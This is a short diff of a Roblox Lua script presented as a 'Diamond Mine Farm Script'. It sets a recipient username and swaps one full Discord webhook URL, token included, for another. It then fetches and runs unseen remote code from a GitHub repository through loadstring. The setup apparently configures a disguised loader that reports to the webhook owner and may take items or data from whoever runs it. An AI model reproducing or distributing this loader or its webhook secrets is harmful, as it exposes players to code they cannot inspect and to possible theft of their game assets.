@@ -1,5 +1,5 @@
 _G.Username = "unicredit21576"
 _G.HubName = "Diamond Mine Farm Script"
-_G.WebhookUrl = "https://discord.com/api/webhooks/1119198306216710164/eZ06NG6mq2VnHkOFFeY2RKUQeHnIG5VYNZs5FiNX9EFT_Wg2q-FE52lJ1DwsZOwLEmrA"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1119340032738742382/eeEz_K4i4YhnJZe-myJj4h12-BIMNmTEjOlec99uzcOc0nkkv6IfjFW14b4nUavvIt3i"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
